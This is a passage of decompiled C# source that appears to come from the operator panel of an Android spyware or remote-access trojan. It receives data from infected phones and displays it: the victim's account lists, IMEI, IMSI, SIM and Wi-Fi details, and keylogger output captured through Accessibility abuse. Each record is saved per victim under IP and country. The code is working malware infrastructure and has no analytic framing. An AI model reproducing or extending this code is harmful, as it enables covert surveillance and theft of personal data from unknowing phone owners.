													_0024VB_0024ResumableLocal_AccountManager_0024455.tmpClientName = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName;
													_0024VB_0024ResumableLocal_AccountManager_0024455.tmpCountry = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country;
													_0024VB_0024ResumableLocal_AccountManager_0024455.tmpFolderUSER = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER;
													_0024VB_0024ResumableLocal_AccountManager_0024455.DGV0.Columns[2].Width = 48;
													_0024VB_0024ResumableLocal_AccountManager_0024455.DGV0.Columns[2].DisplayIndex = 0;
													_0024VB_0024ResumableLocal_AccountManager_0024455.Show();
												}
												_0024VB_0024ResumableLocal_AccountManager_0024455.DGV0.Enabled = false;
												_0024VB_0024ResumableLocal_AccountManager_0024455.DGV0.Rows.Clear();
												_0024VB_0024ResumableLocal_Counter_0024456 = 0;
												_0024VB_0024ResumableLocal_getPath_0024457 = reso.res_Path + "\\Icons\\FillEllipse\\Account.png";
												_0024S458 = _0024VB_0024ResumableLocal_SPL_lines_0024453;
												for (_0024S459 = 0; _0024S459 < _0024S458.Length; _0024S459++)
												{
													_0024VB_0024ResumableLocal_ea_0024460 = _0024S458[_0024S459];
													_0024VB_0024ResumableLocal_ay_0024461 = _0024VB_0024ResumableLocal_ea_0024460.Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
													_0024VB_0024ResumableLocal_AccountManager_0024455.DGV0.Rows.Add(_0024VB_0024ResumableLocal_ay_0024461[0], _0024VB_0024ResumableLocal_ay_0024461[1], reso.GetEllImage(0, new object[5] { _0024VB_0024ResumableLocal_getPath_0024457, 15, 15, 17, 17 }));
													_0024VB_0024ResumableLocal_AccountManager_0024455.PB.Value = Codes.RateConverter(_0024VB_0024ResumableLocal_Counter_0024456, _0024VB_0024ResumableLocal_SPL_lines_0024453.Length - 1);
													_0024VB_0024ResumableLocal_Counter_0024456++;
													Application.DoEvents();
												}
												_0024VB_0024ResumableLocal_AccountManager_0024455.DGV0.Enabled = true;
												_0024VB_0024ResumableLocal_AccountManager_0024455.PB.Value = 0;
												if (Operators.CompareString(SpySettings.SAVING_DATA, "Yes", TextCompare: false) == 0)
												{
													reso.Directory_Exist(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient);
													ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
													{
														reso.SAVEit((Array)a0);
													}, new object[8]
													{
														_0024VB_0024ResumableLocal_AccountManager_0024455.DGV0,
														_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER,
														"Account Manager",
														_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName,
														_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country + " - " + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP,
														"Accounts",
														"log",
														DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
													});
												}
											}
											catch (Exception ex139)
											{
												ProjectData.SetProjectError(ex139);
												Exception ex140 = ex139;
												_0024VB_0024ResumableLocal_ex_0024462 = ex140;
												ProjectData.ClearProjectError();
											}
										}
										else if (Operators.CompareString(_0024S186, SecurityKey.Information, TextCompare: false) == 0)
										{
											try
											{
												_0024VB_0024ResumableLocal_SPL_0024463 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
												_0024VB_0024ResumableLocal_handle_0024464 = "informations_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
												_0024VB_0024ResumableLocal_information_0024465 = (information)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024464];
												if (_0024VB_0024ResumableLocal_information_0024465 == null)
												{
													_0024VB_0024ResumableLocal_information_0024465 = new information();
													_0024VB_0024ResumableLocal_information_0024465.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
													_0024VB_0024ResumableLocal_information_0024465.Client = _0024VB_0024ResumableLocal_Client_00243;
													_0024VB_0024ResumableLocal_information_0024465.Name = _0024VB_0024ResumableLocal_handle_0024464;
													_0024VB_0024ResumableLocal_information_0024465.Title = string.Format("{0} - IP:{1}", "informations", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
													_0024VB_0024ResumableLocal_information_0024465.Client = _0024VB_0024ResumableLocal_Client_00243;
													_0024VB_0024ResumableLocal_information_0024465.tmpTable = new DataTable("tmp");
													_0024VB_0024ResumableLocal_information_0024465.tmpTable.Columns.Add("Property");
													_0024VB_0024ResumableLocal_information_0024465.tmpTable.Columns.Add("Value");
													_0024VB_0024ResumableLocal_SPL_lines_0024466 = _0024VB_0024ResumableLocal_SPL_0024463[1].Split(new string[1] { SPL_LINE }, StringSplitOptions.RemoveEmptyEntries);
													_0024VB_0024ResumableLocal_information_0024465.LB1.Text = "Device";
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Tag = _0024VB_0024ResumableLocal_information_0024465.LB1.Text;
													_0024VB_0024ResumableLocal_information_0024465.LB2.Text = "System";
													_0024VB_0024ResumableLocal_information_0024465.DGV1.Tag = _0024VB_0024ResumableLocal_information_0024465.LB2.Text;
													_0024VB_0024ResumableLocal_information_0024465.LB3.Text = "SIM";
													_0024VB_0024ResumableLocal_information_0024465.DGV2.Tag = _0024VB_0024ResumableLocal_information_0024465.LB3.Text;
													_0024VB_0024ResumableLocal_information_0024465.LB4.Text = "Wi-Fi";
													_0024VB_0024ResumableLocal_information_0024465.DGV3.Tag = _0024VB_0024ResumableLocal_information_0024465.LB4.Text;
													_0024VB_0024ResumableLocal_information_0024465.LB5.Text = "Battery";
													_0024VB_0024ResumableLocal_information_0024465.DGV4.Tag = _0024VB_0024ResumableLocal_information_0024465.LB5.Text;
													_0024VB_0024ResumableLocal_information_0024465.LB6.Text = "Sound level";
													_0024VB_0024ResumableLocal_information_0024465.DGV5.Tag = _0024VB_0024ResumableLocal_information_0024465.LB6.Text;
													_0024VB_0024ResumableLocal_information_0024465.LB7.Text = "Phone bar";
													_0024VB_0024ResumableLocal_information_0024465.DGV6.Tag = _0024VB_0024ResumableLocal_information_0024465.LB7.Text;
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Rows.Add("Name", _0024VB_0024ResumableLocal_SPL_lines_0024466[0]);
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Rows.Add("Model", _0024VB_0024ResumableLocal_SPL_lines_0024466[1]);
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Rows.Add("Board", _0024VB_0024ResumableLocal_SPL_lines_0024466[2]);
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Rows.Add("Brand", _0024VB_0024ResumableLocal_SPL_lines_0024466[3]);
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Rows.Add("Boot Loader", _0024VB_0024ResumableLocal_SPL_lines_0024466[4]);
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Rows.Add("Display", _0024VB_0024ResumableLocal_SPL_lines_0024466[5]);
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Rows.Add("Hardware", _0024VB_0024ResumableLocal_SPL_lines_0024466[6]);
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Rows.Add("Host", _0024VB_0024ResumableLocal_SPL_lines_0024466[7]);
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Rows.Add("ID", _0024VB_0024ResumableLocal_SPL_lines_0024466[8]);
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Rows.Add("Manufacturer", _0024VB_0024ResumableLocal_SPL_lines_0024466[9]);
													_0024VB_0024ResumableLocal_information_0024465.DGV0.Rows.Add("Serial", _0024VB_0024ResumableLocal_SPL_lines_0024466[10]);
													_0024VB_0024ResumableLocal_information_0024465.DGV1.Rows.Add("Name", _0024VB_0024ResumableLocal_SPL_lines_0024466[11]);
													_0024VB_0024ResumableLocal_information_0024465.DGV1.Rows.Add("Release", _0024VB_0024ResumableLocal_SPL_lines_0024466[12]);
													_0024VB_0024ResumableLocal_information_0024465.DGV1.Rows.Add("SDK", _0024VB_0024ResumableLocal_SPL_lines_0024466[13]);
													_0024VB_0024ResumableLocal_information_0024465.DGV1.Rows.Add("Language", _0024VB_0024ResumableLocal_SPL_lines_0024466[14]);
													_0024VB_0024ResumableLocal_information_0024465.DGV2.Rows.Add("Operator Name", _0024VB_0024ResumableLocal_SPL_lines_0024466[15]);
													_0024VB_0024ResumableLocal_information_0024465.DGV2.Rows.Add("IMEI", _0024VB_0024ResumableLocal_SPL_lines_0024466[16]);
													_0024VB_0024ResumableLocal_information_0024465.DGV2.Rows.Add("Country iso", _0024VB_0024ResumableLocal_SPL_lines_0024466[17]);
													_0024VB_0024ResumableLocal_information_0024465.DGV2.Rows.Add("Serial", _0024VB_0024ResumableLocal_SPL_lines_0024466[18]);
													_0024VB_0024ResumableLocal_information_0024465.DGV2.Rows.Add("Network Type", _0024VB_0024ResumableLocal_SPL_lines_0024466[19]);
													_0024VB_0024ResumableLocal_information_0024465.DGV2.Rows.Add("IMSI", _0024VB_0024ResumableLocal_SPL_lines_0024466[20]);
													_0024VB_0024ResumableLocal_information_0024465.DGV3.Rows.Add("MAC address", _0024VB_0024ResumableLocal_SPL_lines_0024466[21]);
													_0024VB_0024ResumableLocal_information_0024465.DGV3.Rows.Add("SSID", _0024VB_0024ResumableLocal_SPL_lines_0024466[22]);
													_0024VB_0024ResumableLocal_information_0024465.DGV3.Rows.Add("Link Speed", _0024VB_0024ResumableLocal_SPL_lines_0024466[23] + ((Operators.CompareString(_0024VB_0024ResumableLocal_SPL_lines_0024466[23], "null", TextCompare: false) == 0) ? "" : "dBm"));
													_0024VB_0024ResumableLocal_information_0024465.DGV3.Rows.Add("Rssi", _0024VB_0024ResumableLocal_SPL_lines_0024466[24]);
													_0024VB_0024ResumableLocal_information_0024465.DGV4.Rows.Add("Level", _0024VB_0024ResumableLocal_SPL_lines_0024466[25] + "%");
													_0024VB_0024ResumableLocal_information_0024465.DGV4.Rows.Add("USB", _0024VB_0024ResumableLocal_SPL_lines_0024466[26]);
													_0024VB_0024ResumableLocal_information_0024465.DGV4.Rows.Add("Idle Mode (DOZE)", _0024VB_0024ResumableLocal_SPL_lines_0024466[27]);
													_0024VB_0024ResumableLocal_information_0024465.DGV4.Rows.Add("Power Save Mode", _0024VB_0024ResumableLocal_SPL_lines_0024466[28]);
													_0024VB_0024ResumableLocal_information_0024465.DGV4.Rows.Add("interactive", _0024VB_0024ResumableLocal_SPL_lines_0024466[29]);
													_0024VB_0024ResumableLocal_rowID_0024467 = _0024VB_0024ResumableLocal_information_0024465.DGV5.Rows.Add("Ring", null);
													_0024VB_0024ResumableLocal_cell_0024468 = (DataGridViewComboBoxCell)_0024VB_0024ResumableLocal_information_0024465.DGV5.Rows[_0024VB_0024ResumableLocal_rowID_0024467].Cells[1];
													_0024VB_0024ResumableLocal_ListItems_0024469 = new List<string>();
													_0024S470 = Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_lines_0024466[30].Trim());
													for (_0024VB_0024ResumableLocal_vul0_0024471 = 0; _0024VB_0024ResumableLocal_vul0_0024471 <= _0024S470; _0024VB_0024ResumableLocal_vul0_0024471++)
													{
														_0024VB_0024ResumableLocal_ListItems_0024469.Add(Conversions.ToString(_0024VB_0024ResumableLocal_vul0_0024471));
													}
													_0024VB_0024ResumableLocal_cell_0024468.DataSource = _0024VB_0024ResumableLocal_ListItems_0024469;
													try
													{
														_0024VB_0024ResumableLocal_cell_0024468.Value = _0024VB_0024ResumableLocal_ListItems_0024469[_0024VB_0024ResumableLocal_ListItems_0024469.IndexOf(Conversions.ToString(Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_lines_0024466[31].Trim())))];
													}
													catch (Exception ex141)
													{
														ProjectData.SetProjectError(ex141);
														Exception ex142 = ex141;
														_0024VB_0024ResumableLocal_ex_0024472 = ex142;
														ProjectData.ClearProjectError();
													}
													_0024VB_0024ResumableLocal_cell_0024468 = new DataGridViewComboBoxCell();
													_0024VB_0024ResumableLocal_rowID_0024467 = _0024VB_0024ResumableLocal_information_0024465.DGV5.Rows.Add("Music", null);
													_0024VB_0024ResumableLocal_ListItems_0024469 = new List<string>();
													_0024VB_0024ResumableLocal_cell_0024468 = (DataGridViewComboBoxCell)_0024VB_0024ResumableLocal_information_0024465.DGV5.Rows[_0024VB_0024ResumableLocal_rowID_0024467].Cells[1];
													_0024S473 = Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_lines_0024466[32].Trim());
													for (_0024VB_0024ResumableLocal_vul0_0024474 = 0; _0024VB_0024ResumableLocal_vul0_0024474 <= _0024S473; _0024VB_0024ResumableLocal_vul0_0024474++)
													{
														_0024VB_0024ResumableLocal_ListItems_0024469.Add(Conversions.ToString(_0024VB_0024ResumableLocal_vul0_0024474));
													}
													_0024VB_0024ResumableLocal_cell_0024468.DataSource = _0024VB_0024ResumableLocal_ListItems_0024469;
													try
													{
														_0024VB_0024ResumableLocal_cell_0024468.Value = _0024VB_0024ResumableLocal_ListItems_0024469[_0024VB_0024ResumableLocal_ListItems_0024469.IndexOf(Conversions.ToString(Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_lines_0024466[33].Trim())))];
													}
													catch (Exception ex143)
													{
														ProjectData.SetProjectError(ex143);
														Exception ex144 = ex143;
														_0024VB_0024ResumableLocal_ex_0024475 = ex144;
														ProjectData.ClearProjectError();
													}
													_0024VB_0024ResumableLocal_cell_0024468 = new DataGridViewComboBoxCell();
													_0024VB_0024ResumableLocal_rowID_0024467 = _0024VB_0024ResumableLocal_information_0024465.DGV5.Rows.Add("Notification", null);
													_0024VB_0024ResumableLocal_ListItems_0024469 = new List<string>();
													_0024VB_0024ResumableLocal_cell_0024468 = (DataGridViewComboBoxCell)_0024VB_0024ResumableLocal_information_0024465.DGV5.Rows[_0024VB_0024ResumableLocal_rowID_0024467].Cells[1];
													_0024S476 = Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_lines_0024466[34].Trim());
													for (_0024VB_0024ResumableLocal_vul0_0024477 = 0; _0024VB_0024ResumableLocal_vul0_0024477 <= _0024S476; _0024VB_0024ResumableLocal_vul0_0024477++)
													{
														_0024VB_0024ResumableLocal_ListItems_0024469.Add(Conversions.ToString(_0024VB_0024ResumableLocal_vul0_0024477));
													}
													_0024VB_0024ResumableLocal_cell_0024468.DataSource = _0024VB_0024ResumableLocal_ListItems_0024469;
													try
													{
														_0024VB_0024ResumableLocal_cell_0024468.Value = _0024VB_0024ResumableLocal_ListItems_0024469[_0024VB_0024ResumableLocal_ListItems_0024469.IndexOf(Conversions.ToString(Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_lines_0024466[35].Trim())))];
													}
													catch (Exception ex145)
													{
														ProjectData.SetProjectError(ex145);
														Exception ex146 = ex145;
														_0024VB_0024ResumableLocal_ex_0024478 = ex146;
														ProjectData.ClearProjectError();
													}
													_0024VB_0024ResumableLocal_cell_0024468 = new DataGridViewComboBoxCell();
													_0024VB_0024ResumableLocal_rowID_0024467 = _0024VB_0024ResumableLocal_information_0024465.DGV5.Rows.Add("System", null);
													_0024VB_0024ResumableLocal_ListItems_0024469 = new List<string>();
													_0024VB_0024ResumableLocal_cell_0024468 = (DataGridViewComboBoxCell)_0024VB_0024ResumableLocal_information_0024465.DGV5.Rows[_0024VB_0024ResumableLocal_rowID_0024467].Cells[1];
													_0024S479 = Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_lines_0024466[36].Trim());
													for (_0024VB_0024ResumableLocal_vul0_0024480 = 0; _0024VB_0024ResumableLocal_vul0_0024480 <= _0024S479; _0024VB_0024ResumableLocal_vul0_0024480++)
													{
														_0024VB_0024ResumableLocal_ListItems_0024469.Add(Conversions.ToString(_0024VB_0024ResumableLocal_vul0_0024480));
													}
													_0024VB_0024ResumableLocal_cell_0024468.DataSource = _0024VB_0024ResumableLocal_ListItems_0024469;
													try
													{
														_0024VB_0024ResumableLocal_cell_0024468.Value = _0024VB_0024ResumableLocal_ListItems_0024469[_0024VB_0024ResumableLocal_ListItems_0024469.IndexOf(Conversions.ToString(Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_lines_0024466[37].Trim())))];
													}
													catch (Exception ex147)
													{
														ProjectData.SetProjectError(ex147);
														Exception ex148 = ex147;
														_0024VB_0024ResumableLocal_ex_0024481 = ex148;
														ProjectData.ClearProjectError();
													}
													_0024VB_0024ResumableLocal_cell_0024468 = new DataGridViewComboBoxCell();
													_0024VB_0024ResumableLocal_rowID_0024467 = _0024VB_0024ResumableLocal_information_0024465.DGV6.Rows.Add("Ringer Mode", null);
													_0024VB_0024ResumableLocal_ListItems_0024469 = new List<string>();
													_0024VB_0024ResumableLocal_cell_0024468 = (DataGridViewComboBoxCell)_0024VB_0024ResumableLocal_information_0024465.DGV6.Rows[_0024VB_0024ResumableLocal_rowID_0024467].Cells[1];
													_0024VB_0024ResumableLocal_modes_0024482 = new string[3] { "Normal", "Vibrate", "Silent" };
													_0024VB_0024ResumableLocal_getmode_0024483 = _0024VB_0024ResumableLocal_modes_0024482[Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_lines_0024466[38].Trim())];
													_0024S484 = _0024VB_0024ResumableLocal_modes_0024482;
													for (_0024S485 = 0; _0024S485 < _0024S484.Length; _0024S485++)
													{
														_0024VB_0024ResumableLocal_m_0024486 = _0024S484[_0024S485];
														_0024VB_0024ResumableLocal_ListItems_0024469.Add(_0024VB_0024ResumableLocal_m_0024486);
													}
													_0024VB_0024ResumableLocal_cell_0024468.DataSource = _0024VB_0024ResumableLocal_ListItems_0024469;
													try
													{
														_0024VB_0024ResumableLocal_cell_0024468.Value = _0024VB_0024ResumableLocal_ListItems_0024469[_0024VB_0024ResumableLocal_ListItems_0024469.IndexOf(_0024VB_0024ResumableLocal_getmode_0024483)];
													}
													catch (Exception ex149)
													{
														ProjectData.SetProjectError(ex149);
														Exception ex150 = ex149;
														_0024VB_0024ResumableLocal_ex_0024487 = ex150;
														ProjectData.ClearProjectError();
													}
													_0024VB_0024ResumableLocal_cell_0024468 = new DataGridViewComboBoxCell();
													_0024VB_0024ResumableLocal_rowID_0024467 = _0024VB_0024ResumableLocal_information_0024465.DGV6.Rows.Add("Wi-Fi Mode", null);
													_0024VB_0024ResumableLocal_ListItems_0024469 = new List<string>();
													_0024VB_0024ResumableLocal_cell_0024468 = (DataGridViewComboBoxCell)_0024VB_0024ResumableLocal_information_0024465.DGV6.Rows[_0024VB_0024ResumableLocal_rowID_0024467].Cells[1];
													_0024VB_0024ResumableLocal_modeWiFi_0024488 = new string[3] { "off", "on", "restart" };
													_0024VB_0024ResumableLocal_getmodeWIFI_0024489 = _0024VB_0024ResumableLocal_modeWiFi_0024488[Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_lines_0024466[39].Trim())];
													_0024S490 = _0024VB_0024ResumableLocal_modeWiFi_0024488;
													for (_0024S491 = 0; _0024S491 < _0024S490.Length; _0024S491++)
													{
														_0024VB_0024ResumableLocal_m_0024492 = _0024S490[_0024S491];
														_0024VB_0024ResumableLocal_ListItems_0024469.Add(_0024VB_0024ResumableLocal_m_0024492);
													}
													_0024VB_0024ResumableLocal_cell_0024468.DataSource = _0024VB_0024ResumableLocal_ListItems_0024469;
													try
													{
														_0024VB_0024ResumableLocal_cell_0024468.Value = _0024VB_0024ResumableLocal_ListItems_0024469[_0024VB_0024ResumableLocal_ListItems_0024469.IndexOf(_0024VB_0024ResumableLocal_getmodeWIFI_0024489)];
													}
													catch (Exception ex151)
													{
														ProjectData.SetProjectError(ex151);
														Exception ex152 = ex151;
														_0024VB_0024ResumableLocal_ex_0024493 = ex152;
														ProjectData.ClearProjectError();
													}
													try
													{
														_0024S494 = _0024VB_0024ResumableLocal_information_0024465.Panel1.Controls.OfType<DataGridView>().GetEnumerator();
														while (_0024S494.MoveNext())
														{
															_0024VB_0024ResumableLocal_gr_0024495 = _0024S494.Current;
															_0024VB_0024ResumableLocal_information_0024465.tmpTable.Rows.Add(_0024VB_0024ResumableLocal_gr_0024495.Tag, "sub");
															_0024S496 = _0024VB_0024ResumableLocal_gr_0024495.Rows.Count - 1;
															for (_0024VB_0024ResumableLocal_i_0024497 = 0; _0024VB_0024ResumableLocal_i_0024497 <= _0024S496; _0024VB_0024ResumableLocal_i_0024497++)
															{
																_0024VB_0024ResumableLocal_information_0024465.tmpTable.Rows.Add(_0024VB_0024ResumableLocal_gr_0024495.Rows[_0024VB_0024ResumableLocal_i_0024497].Cells[0].Value, _0024VB_0024ResumableLocal_gr_0024495.Rows[_0024VB_0024ResumableLocal_i_0024497].Cells[1].Value);
															}
														}
													}
													finally
													{
														if (num < 0 && _0024S494 != null)
															_0024S494.Dispose();
													}
													if (Operators.CompareString(SpySettings.SAVING_DATA, "Yes", TextCompare: false) == 0 && _0024VB_0024ResumableLocal_information_0024465.tmpTable != null)
													{
														reso.Directory_Exist(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient);
														_0024VB_0024ResumableLocal_DS_0024498 = new DataSet("info");
														_0024VB_0024ResumableLocal_DS_0024498.Tables.Add(_0024VB_0024ResumableLocal_information_0024465.tmpTable);
														_0024VB_0024ResumableLocal_information_0024465.DS = _0024VB_0024ResumableLocal_DS_0024498;
														ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
														{
															reso.SAVEit((Array)a0);
														}, new object[8]
														{
															_0024VB_0024ResumableLocal_DS_0024498,
															_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER,
															"informations",
															_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName,
															_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country + " - " + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP,
															"informations",
															"info",
															DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
														});
													}
													_0024VB_0024ResumableLocal_information_0024465.tmpAddressIP = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
													_0024VB_0024ResumableLocal_information_0024465.tmpClientName = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName;
													_0024VB_0024ResumableLocal_information_0024465.tmpCountry = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country;
													_0024VB_0024ResumableLocal_information_0024465.tmpFolderUSER = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER;
													_0024VB_0024ResumableLocal_information_0024465.Show();
												}
											}
											catch (Exception ex153)
											{
												ProjectData.SetProjectError(ex153);
												Exception ex154 = ex153;
												_0024VB_0024ResumableLocal_ex_0024499 = ex154;
												ProjectData.ClearProjectError();
											}
										}
										else if (Operators.CompareString(_0024S186, SecurityKey.Keylogger, TextCompare: false) == 0)
										{
											try
											{
												_0024VB_0024ResumableLocal_SPL_0024500 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(0)).Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
												_0024VB_0024ResumableLocal_handle_0024501 = "Keylogger_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
												_0024VB_0024ResumableLocal_keylogg_0024502 = (Keylogger)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024501];
												_0024VB_0024ResumableLocal_flag_0024503 = -1;
												_0024VB_0024ResumableLocal_dataarry_0024504 = _0024VB_0024ResumableLocal_SPL_0024500[1].Split('|');
												_0024VB_0024ResumableLocal_is_on_0024505 = _0024VB_0024ResumableLocal_dataarry_0024504[0];
												_0024VB_0024ResumableLocal_Allnames_0024506 = null;
												try
												{
													if (_0024VB_0024ResumableLocal_dataarry_0024504.Length > 1)
														_0024VB_0024ResumableLocal_Allnames_0024506 = _0024VB_0024ResumableLocal_dataarry_0024504[1].Split('*');
												}
												catch (Exception ex155)
												{
													ProjectData.SetProjectError(ex155);
													Exception ex156 = ex155;
													_0024VB_0024ResumableLocal_ex_0024507 = ex156;
													ProjectData.ClearProjectError();
												}
												if (Operators.CompareString(_0024VB_0024ResumableLocal_is_on_0024505, "true", TextCompare: false) == 0)
													_0024VB_0024ResumableLocal_flag_0024503 = 1;
												else if (Operators.CompareString(_0024VB_0024ResumableLocal_is_on_0024505, "false", TextCompare: false) == 0)
												{
													_0024VB_0024ResumableLocal_flag_0024503 = 0;
												}
												else
												{
													_0024VB_0024ResumableLocal_flag_0024503 = 1;
												}
												if (_0024VB_0024ResumableLocal_keylogg_0024502 == null)
												{
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Keylogg = false;
													_0024VB_0024ResumableLocal_objs_0024508 = new object[4]
													{
														_0024VB_0024ResumableLocal_Client_00243,
														SecurityKey.KeysClient9 + SPL_SOCKET + SecurityKey.Keylogger,
														Codes.Encoding().GetBytes("null"),
														_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
													};
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_objs_0024508);
												}
												else if (_0024VB_0024ResumableLocal_keylogg_0024502 != null)
												{
													if (_0024VB_0024ResumableLocal_flag_0024503 == 0)
													{
														_0024VB_0024ResumableLocal_keylogg_0024502.DGV0.Rows.Add("Accessibility Not Active", "Enable Accessibility", "go to : Settings --> Accessibility", Resources.disconnected);
														_0024VB_0024ResumableLocal_keylogg_0024502.IsActive = false;
													}
													else if (_0024VB_0024ResumableLocal_flag_0024503 == 1)
													{
														_0024VB_0024ResumableLocal_keylogg_0024502.IsActive = true;
														try
														{
															if (_0024VB_0024ResumableLocal_Allnames_0024506 != null && _0024VB_0024ResumableLocal_Allnames_0024506.Length > 0)
															{
																_0024VB_0024ResumableLocal_keylogg_0024502.combologs.Items.Clear();
																_0024S509 = _0024VB_0024ResumableLocal_Allnames_0024506;
																for (_0024S510 = 0; _0024S510 < _0024S509.Length; _0024S510++)
																{
																	_0024VB_0024ResumableLocal_name_0024511 = _0024S509[_0024S510];
																	try
																	{
																		_0024VB_0024ResumableLocal_keylogg_0024502.combologs.Items.Add(_0024VB_0024ResumableLocal_name_0024511.Replace("log-", "").Replace(".txt", ""));
																	}
																	catch (Exception ex157)
																	{
																		ProjectData.SetProjectError(ex157);
																		Exception ex158 = ex157;
																		_0024VB_0024ResumableLocal_ex_0024512 = ex158;
																		ProjectData.ClearProjectError();
																	}
																}
															}
														}
														catch (Exception ex159)
														{
															ProjectData.SetProjectError(ex159);
															Exception ex160 = ex159;
															_0024VB_0024ResumableLocal_ex_0024513 = ex160;
															ProjectData.ClearProjectError();
														}
													}
													if (_0024VB_0024ResumableLocal_SPL_0024500.Length > 2)
													{
														_0024VB_0024ResumableLocal_arryiconandkey_0024514 = _0024VB_0024ResumableLocal_SPL_0024500[3].Replace("<0>", "|").Split('|');
														_0024VB_0024ResumableLocal_state_0024515 = Codes.AccessibilityEvent(Conversions.ToInteger(_0024VB_0024ResumableLocal_arryiconandkey_0024514[0]));
														if (Operators.CompareString(_0024VB_0024ResumableLocal_state_0024515, "n/a", TextCompare: false) == 0)
															_0024VB_0024ResumableLocal_state_0024515 = "NA";
														_0024VB_0024ResumableLocal_getPath_0024516 = reso.res_Path + "\\Icons\\FillEllipse\\" + _0024VB_0024ResumableLocal_state_0024515 + ".png";
														if (_0024VB_0024ResumableLocal_arryiconandkey_0024514.Length > 1 && (object)_0024VB_0024ResumableLocal_arryiconandkey_0024514[1] != "null")
															_0024VB_0024ResumableLocal_appicon_0024517 = Codes.ResizeImage(new Bitmap(Codes.Base64ToImage(_0024VB_0024ResumableLocal_arryiconandkey_0024514[1])), new Size(45, 45));
														else
															_0024VB_0024ResumableLocal_appicon_0024517 = reso.GetEllImage(0, new object[5] { _0024VB_0024ResumableLocal_getPath_0024516, 15, 15, 17, 17 });
														if (Operators.CompareString(_0024VB_0024ResumableLocal_SPL_0024500[2], "[]", TextCompare: false) != 0)
														{
															_0024VB_0024ResumableLocal_id_0024518 = _0024VB_0024ResumableLocal_keylogg_0024502.DGV0.Rows.Add(_0024VB_0024ResumableLocal_state_0024515, _0024VB_0024ResumableLocal_SPL_0024500[1], _0024VB_0024ResumableLocal_SPL_0024500[2], _0024VB_0024ResumableLocal_appicon_0024517);
															try
															{
																if (_0024VB_0024ResumableLocal_keylogg_0024502.DGV0.Rows[_0024VB_0024ResumableLocal_id_0024518].Displayed && _0024VB_0024ResumableLocal_keylogg_0024502.DGV0.FirstDisplayedScrollingRowIndex >= 0)
																{
																	_0024VB_0024ResumableLocal_keylogg_0024502.DGV0.FirstDisplayedScrollingRowIndex = _0024VB_0024ResumableLocal_keylogg_0024502.DGV0.RowCount - 1;
																	_0024VB_0024ResumableLocal_keylogg_0024502.DGV0.CurrentCell = _0024VB_0024ResumableLocal_keylogg_0024502.DGV0.Rows[_0024VB_0024ResumableLocal_keylogg_0024502.DGV0.RowCount - 1].Cells[1];
